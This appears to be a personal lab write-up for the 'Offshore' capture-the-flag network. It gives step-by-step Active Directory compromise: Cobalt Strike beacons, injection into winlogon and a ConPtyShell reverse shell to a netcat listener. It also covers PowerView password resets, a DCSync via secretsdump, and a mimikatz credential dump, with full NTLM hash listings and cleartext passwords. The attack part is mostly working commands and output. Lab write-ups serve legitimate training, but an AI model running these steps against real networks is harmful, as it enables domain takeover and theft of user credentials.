
This flag was difficult, Grow helped me fix the issue where my commands weren't working. The main issue on why they weren't working was because of the integrity of the shell that I was running in, which was a 0 integrity shell, typicall you need to be in a 1 integrity shell.

[[Whats the worst that could happen]]


Start at the `I'll Take fries with that` shell
![[Pasted image 20231229124706.png]]
once on `sql01\justalocaladmin` pop a cobalt strike beacon, I just utilized an http beacon
![[Pasted image 20231229124845.png]]
once a beacon has been popped on `SQL01` as `justalocaladmin` utilize the beacon to psexec into `SQL01` with `SMB` to beacom `SYSTEM`
![[Pasted image 20231229212252.png]]
this is the command used to pop a `SYSTEM` beacon
![[Pasted image 20231229212554.png]]
next go into the `SYSTEM` beacon and elevate to a `1` session through injecting into a `1` process
![[Pasted image 20231229212816.png]]
right click the beacon -> explore -> process list to utilize the GUI for injection
![[Pasted image 20231229213040.png]]
 winlogon is typically a good process to inject into
![[Pasted image 20231229212943.png]]once on as a `SESSION 1` shell download this script `https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1` onto kali - this is to get an upgraded shell with `SESSION 1` privileges
![[Pasted image 20231229213357.png]]
follow the `POC` on the github to setup a `netcat` listener
![[Pasted image 20231229213452.png]]
`powershell-import` the new script into the `SESSION 1` cobaltstrike session
![[Pasted image 20231229213604.png]]
`powershell-invoke` the script to pop a reverse shell
![[Pasted image 20231229213637.png]]
upload `powerview.ps1` to `C:\Windows\Tasks` in the `SYSTEM` `SESSION 1` beacon and run it in the `CON` reverse shell
![[Pasted image 20231229214417.png]]

once in the shell utilize the `BLOODHOUND` recommendation of commands to change the user `salvador`'s password with the `corp.local\pgibbons` credentials

```powershell
$SecPassword = ConvertTo-SecureString 'I l0ve going Fishing!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('corp.local\pgibbons', $SecPassword)
$UserPassword = ConvertTo-SecureString 'bugs_b3_hacking_u' -AsPlainText -Force
Set-DomainUserPassword -Identity salvador -AccountPassword $UserPassword -Credential $Cred
```
![[Pasted image 20231229214516.png]]
utilize `proxychains crackmapexec smb 172.16.1.0/24 -u salvador -p 'bugs_b3_hacking_u'` to ensure salvador's password was changed
![[Pasted image 20231229214919.png]]
now setting the `cyber_adm` password
```powershell
PS C:\Windows\Tasks> $username = 'corp\salvador'
PS C:\Windows\Tasks> $password = 'bugs_b3_hacking_u'
PS C:\Windows\Tasks> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\Windows\Tasks> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
PS C:\Windows\Tasks> $UserPassword = ConvertTo-SecureString 'bugs_b3_hacking_u' -AsPlainText -Force
PS C:\Windows\Tasks> Set-DomainUserPassword -Identity cyber_adm -AccountPassword $securePassword -credential $credential
```
![[Pasted image 20231230021101.png]]
checking to ensure the password was set.
![[Pasted image 20231230021131.png]]
`proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py cyber_adm@172.16.1.24` to login
![[Pasted image 20231230022208.png]]
grab flag
![[Pasted image 20231230022228.png]]
`OFFSHORE{it_@ll_c0m3s_FuLl_c1rcl3}`


# Beginning to try to get to DC with DCSYNC
According to bloodhound since we have access as `CYBER_ADM@CORP.LOCAL` we are able to DCSync
![[Pasted image 20240102132058.png]]
attempted to get cobaltstrike beacon as `CORP\CYBER_ADM` was initially able to get a beacon, now access denied.  The first beacon died.

![[Pasted image 20240102132454.png]]

utilized `secretsdump.py` to DCsync the `corp.local` domain`

```powershell
┌──(root💀gobots)-[02Jan2024 13:50:26]-[/usr/share/doc/python3-impacket/examples]                                                                                                                           
└─# proxychains python3 secretsdump.py -just-dc cyber_adm:bugs_b3_hacking_u@172.16.1.5                                                                                                                      
[proxychains] config file found: /etc/proxychains4.conf                                                                                                                                                     
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                                                                                                                      
Impacket v0.11.0 - Copyright 2023 Fortra                                                                                                                                                                    
                                                                                                                                                                                                            
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                               
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                                        
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0109d7e72fcfe404186c4079ba6cf79c:::                                                                                                                      
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cba2ed22077aa56ae957bcf43a8d82f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
bob:1110:aad3b435b51404eeaad3b435b51404ee:b38c126d0faabc61362ecc83ccb0cd08:::
joe:1111:aad3b435b51404eeaad3b435b51404ee:fde396caf28acc233207b2706483024f:::
bill:1113:aad3b435b51404eeaad3b435b51404ee:47b4d6012d7dcf231d8533758231c80d:::
salvador:1114:aad3b435b51404eeaad3b435b51404ee:bcee59fae528be44811e1b91ce3a8c35:::
lazy_admin:1119:aad3b435b51404eeaad3b435b51404ee:d168f91992f800743144f24518de5f2b:::
vincent.delpy:1120:aad3b435b51404eeaad3b435b51404ee:f5e7702e1032710f9f16ef8a691da861:::
iamtheadministrator:1122:aad3b435b51404eeaad3b435b51404ee:70016778cb0524c799ac25b439bd67e0:::
justalocaladmin:1603:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::
corp.local\GStephenson:1604:aad3b435b51404eeaad3b435b51404ee:a6c9bca7e1f4076c538ff6e7096d59be:::
corp.local\AMountgarrett:1605:aad3b435b51404eeaad3b435b51404ee:4b76b38df5e9adf9739c8f43869d91ce:::
corp.local\JHann:1606:aad3b435b51404eeaad3b435b51404ee:1d863479e1ab3bd62a2bfafa1abaa2dd:::
corp.local\LBellantoni:1607:aad3b435b51404eeaad3b435b51404ee:2c019748d27c982f3be03c378759a954:::
corp.local\LGresham:1608:aad3b435b51404eeaad3b435b51404ee:520d2dcba9759412cda4eeeb524e5407:::
corp.local\EReynolds:1609:aad3b435b51404eeaad3b435b51404ee:bb413fd4eab36d867ae30ca134911ef6:::
corp.local\MTorres:1610:aad3b435b51404eeaad3b435b51404ee:a1e69cd82485430ad9f732a7673b0732:::
corp.local\OCollier:1611:aad3b435b51404eeaad3b435b51404ee:9e5c6bcd86c00d97c22f8630be9e4f35:::
corp.local\KSteele:1612:aad3b435b51404eeaad3b435b51404ee:4192316432ae3c0b0e9c948d494e64fa:::
corp.local\LMacghey:1613:aad3b435b51404eeaad3b435b51404ee:35fb7b7d541ed4fee611fbefe89707c6:::
corp.local\FFigueroa:1614:aad3b435b51404eeaad3b435b51404ee:d365fa7447d7cf17e62ba4758b67632e:::
corp.local\RFord:1615:aad3b435b51404eeaad3b435b51404ee:ece851cce21d0092e2d1e61537dd351e:::
corp.local\LPotter:1616:aad3b435b51404eeaad3b435b51404ee:6ded62367988f54d2d562621d6532051:::
corp.local\SYoung:1617:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
corp.local\BMoore:1618:aad3b435b51404eeaad3b435b51404ee:65d8f7784ce4eed6b2c1a028c4e54866:::
corp.local\ZWootten:1619:aad3b435b51404eeaad3b435b51404ee:561d7ee942fadd19101ccdb0a5fde05a:::
corp.local\SBradshaw:1620:aad3b435b51404eeaad3b435b51404ee:c377ac42a9918b3ccda3f1585484665a:::
corp.local\DDavis:1621:aad3b435b51404eeaad3b435b51404ee:027dcae638b664716cdc075fa4cbc493:::
corp.local\EMoulds:1622:aad3b435b51404eeaad3b435b51404ee:916c1dbf6a2a698bfbb4104d3fe55974:::

```

```powershell
[01/09 16:02:15] beacon> mimikatz !sekurlsa::logonpasswords
[01/09 16:02:15] [*] Tasked beacon to run mimikatz's !sekurlsa::logonpasswords command
[01/09 16:02:16] [+] host called home, sent: 815436 bytes
[01/09 16:02:33] [+] received output:

Authentication Id : 0 ; 7841633 (00000000:0077a761)
Session           : Batch from 0
User Name         : iamtheadministrator
Domain            : CORP
Logon Server      : DC01
Logon Time        : 1/9/2024 2:56:24 PM
SID               : S-1-5-21-2291914956-3290296217-2402366952-1122
	msv :	
	 [00000003] Primary
	 * Username : iamtheadministrator
	 * Domain   : CORP
	 * NTLM     : 70016778cb0524c799ac25b439bd67e0
	 * SHA1     : 971ee5007c3fdca1ab6c55b98488b1d6c9a7f046
	 * DPAPI    : 74ea433d1737c81f58ae0c74d959d3eb
	tspkg :	
	wdigest :	
	 * Username : iamtheadministrator
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : iamtheadministrator
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	
	 [00000000]
	 * Username : iamtheadministrator
	 * Domain   : iamtheadministrator
	 * Password : Password2!
```